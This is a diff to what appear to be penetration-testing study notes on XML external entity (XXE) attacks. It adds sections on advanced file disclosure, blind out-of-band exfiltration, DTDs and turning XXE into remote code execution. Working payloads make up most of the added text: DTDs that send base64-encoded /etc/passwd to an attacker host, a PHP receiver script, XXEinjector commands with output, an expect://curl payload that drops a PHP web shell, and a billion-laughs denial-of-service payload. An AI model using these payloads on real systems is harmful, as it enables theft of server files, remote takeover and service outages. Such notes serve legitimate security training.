@@ -4,7 +4,6 @@ family: "ssrf-xxe-file"
 severity_hint: "critical"
 tags: ["XXE", "XML", "Remote Code Execution", "SSRF", "XSS", "DoS", "403", "NTLM", "PDF", "PHP", "HTTP"]
 source: "_raw/Web attacks/Web Attacks/XXE.md"
-source_sha256: "61e40636566d70de306acaffa3b844b1ccd5268252a1b439ec4327d35dcb427b"
 curator_version: 2
 review_status: imported-unreviewed
 ---
@@ -468,5 +467,314 @@ If the web is using PHP, instead of using `file:/` you can use **php wrappers** 
 
 [XXE - XEE - XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
 
+## Advanced File Disclosure
+
+### Advanced Exfiltration with CDATA
+
+Extract any kind of data (including binary data) for any web application backend. To output data that does not conform to the XML format, wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). Define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, then place the external entity file in between:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+
+However, this will not work, since XML prevents joining internal and external entities. Use `XML Parameter Entities` instead — a special entity type that starts with a `%` character and can only be used within the DTD. If referenced from an external source (e.g. our own server), all of them are considered external and can be joined:
+
+```xml
+<!ENTITY joined "%begin;%file;%end;">
+```
+
+Read the `submitDetails.php` file by first storing the above line in a DTD file (e.g. `xxe.dtd`), hosting it on our machine, and then referencing it as an external entity on the target web application:
+
+```bash
+$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+$ python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (<http://0.0.0.0:8000/>) ...
+```
+
+Reference the external entity (`xxe.dtd`) and then print the `&joined;`:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+
+> Note: on some modern web servers, reading some files (like `index.php`) may not work, since the server prevents a DoS caused by file/entity self-reference (XML entity reference loop).
+
+### Error Based XXE
+
+When the web application neither writes any XML output nor displays any errors, the situation is completely blind. First try to send malformed XML data and see if errors occur: delete a closing tag, change one of the tags (e.g. `<roo>` instead of `<root>`), or reference a non-existing entity. If an error reveals a web server directory, it can be used to read the source code of other files.
+
+Host a DTD file with the following payload — define the `file` parameter entity and join it with an entity that does not exist (`%nonExistingEntity;`); the web application throws an error saying the entity doesn't exist and also prints the joined `%file;` as part of the error:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+
+Call the external DTD script, then reference the `error` entity:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
+The source code of files can also be read by changing the DTD to `"file:///var/www/html/submitDetails.php"`. This method is not as reliable as CDATA-based exfiltration, since it may have length limitations and certain special characters may still break it.
+
+## Blind Data Exfiltration
+
+Blind situation: neither the output of the XML entities nor any PHP errors are displayed.
+
+### Out-of-bound Data Exfiltration
+
+Used in similar blind cases across many web attacks (blind SQLi, blind command injection, blind XSS, blind XXE). Instead of having the web application output the `file` entity to a specific XML entity, make the web application send a web request to our web server with the content of the file being read. Use a parameter entity for the file content while utilizing a PHP filter to base64 encode it, create another external parameter entity referenced to our IP, then place the `file` parameter value as part of the URL being requested over HTTP:
+
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+
+Simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
+
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\\n\\n" . base64_decode($_GET['content']));
+}
+?>
+```
+
+```bash
+$ vi index.php # here we write the above PHP code
+$ php -S 0.0.0.0:8000
+
+PHP 7.4.3 Development Server (<http://0.0.0.0:8000>) started
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+```bash
+PHP 7.4.3 Development Server (<http://0.0.0.0:8000>) started
+10.10.14.16:46256 Accepted
+10.10.14.16:46256 [200]: (null) /xxe.dtd
+10.10.14.16:46256 Closing
+10.10.14.16:46258 Accepted
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...SNIP...
+```
+
+> Tip: in addition to storing base64-encoded data as a URL parameter, `DNS OOB Exfiltration` can place the encoded data as a subdomain of our URL (e.g. `ENCODEDTEXT.our.website.com`), then a tool like `tcpdump` captures incoming traffic and decodes the subdomain string. More advanced, requires more effort.
+
+### Automated OOB Exfiltration
+
+[XXEinjector](https://github.com/enjoiz/XXEinjector):
+
+```bash
+$ git clone <https://github.com/enjoiz/XXEinjector.git>
+
+Cloning into 'XXEinjector'...
+...SNIP...
+```
+
+Copy the HTTP request from Burp and write it to a file for the tool to use, with `XXEINJECT` after it as a position locator:
+
+```
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: <http://10.129.201.94>
+Referer: <http://10.129.201.94/blind/>
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+
+```bash
+$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+
+...SNIP...
+[+] Sending request with malicious XML.
+[+] Responding with XML for: /etc/passwd
+[+] Retrieved data:
+```
+
+All files get stored in the `Logs` folder:
+
+```bash
+$ cat Logs/10.129.201.94/etc/passwd.log
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...SNIP..
+```
+
+```html
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE name [
+  <!ENTITY % remote SYSTEM "<http://10.10.16.27:8000/xxe.dtd>">
+  %remote;
+  %oob;
+]>
+            <root>
+            <name>&content;</name>
+            <details>Details</details>
+            <date>1999-02-03</date>
+            </root>
+```
+
+## DTDs
+
+A DTD (Document Type Definition) is a set of rules that defines the structure of an XML document — like a database schema, it's a blueprint of which elements (tags) and attributes are allowed in the XML file.
+
+For example, to ensure an XML document about `people` always includes a `name`, `address`, `email`, and `phone number`, define those rules through a DTD:
+
+```xml
+<!DOCTYPE people [
+   <!ELEMENT people(name, address, email, phone)>
+   <!ELEMENT name (#PCDATA)>
+   <!ELEMENT address (#PCDATA)>
+   <!ELEMENT email (#PCDATA)>
+   <!ELEMENT phone (#PCDATA)>
+]>
+```
+
+`<!ELEMENT>` defines the elements (tags) that are allowed, like `name`, `address`, `email`, and `phone`; `#PCDATA` stands for parsed character data, meaning it consists of plain text only.
+
+## LFI/RCE
+
+### Local File Disclosure
+
+When an application trusts unfiltered XML data from user input, it may be possible to reference an external XML DTD document and define new custom XML entities.
+
+### Identifying
+
+First find web pages that accept XML user input, ideally with outdated XML libraries and no filtering/sanitization. Note which elements get displayed in the response, since that determines what to inject into. Try defining a new entity and referencing it in a displayed element to see whether it gets replaced with the defined value:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY company "Inlane Freight">
+]>
+```
+
+> Note: if the XML request had no `DOCTYPE` declared internally or externally, add a new DTD before defining the entity. If `DOCTYPE` was already declared, just add the `ENTITY` element to it.
+
+> Note: some web applications default to JSON but may still accept XML — try changing `Content-Type` to `application/xml` and converting the JSON body to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm) to test for XXE even when the app normally speaks JSON.
+
+### Reading Sensitive Files
+
+Define an external entity with the `SYSTEM` keyword and a path:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+```
+
+> Tip: in certain Java web applications, specifying a directory instead of a file returns a directory listing — useful for locating sensitive files.
+
+### Reading Source Code
+
+If the referenced file isn't in proper XML format, referencing it as an external XML entity fails — special characters like `<`/`>`/`&` break the reference, and binary data won't conform to XML either. Use PHP's `php://filter/` wrapper instead of `file://`, with the `convert.base64-encode` encoder and an input resource:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
+
+This trick only works with PHP web applications.
+
+### Remote Code Execution with XXE
+
+The easiest method is looking for SSH keys. Commands can also be executed on PHP-based applications through the `php://expect` filter (requires the PHP `expect` module installed/enabled) — e.g. `expect://id`. The most efficient method to turn XXE into RCE is fetching a web shell from our server and writing it to the web app, then interacting with it:
+
+```bash
+$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+$ sudo python3 -m http.server 80
+```
+
+Use the following XML to execute a `curl` command that downloads the web shell onto the remote server:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+```
+
+> Note: spaces are replaced with `$IFS` above to avoid breaking XML syntax. Characters like `|`, `>`, and `{` may also break the code — avoid them.
+
+### Other XXE Attacks
+
+SSRF exploitation can enumerate locally open ports and access restricted pages through the XXE vulnerability. DoS is another option:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY a0 "DOS" >
+  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
+  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&a10;</email>
+<message></message>
+</root>
+```
+
+This particular self-reference attack no longer works against modern web servers (e.g. Apache), which protect against entity self-reference.
+
 ## Source
-Original note: `_raw/Web attacks/Web Attacks/XXE.md`
+Original notes:
+- `_raw/Web attacks/Web Attacks/XXE.md`
+- `_raw/Web attacks/Web Attacks/XXE/Advanced File Disclosure.md`
+- `_raw/Web attacks/Web Attacks/XXE/Blind Data Exfiltration.md`
+- `_raw/Web attacks/Web Attacks/XXE/DTD’s.md`
+- `_raw/Web attacks/Web Attacks/XXE/LFI and RCE.md`
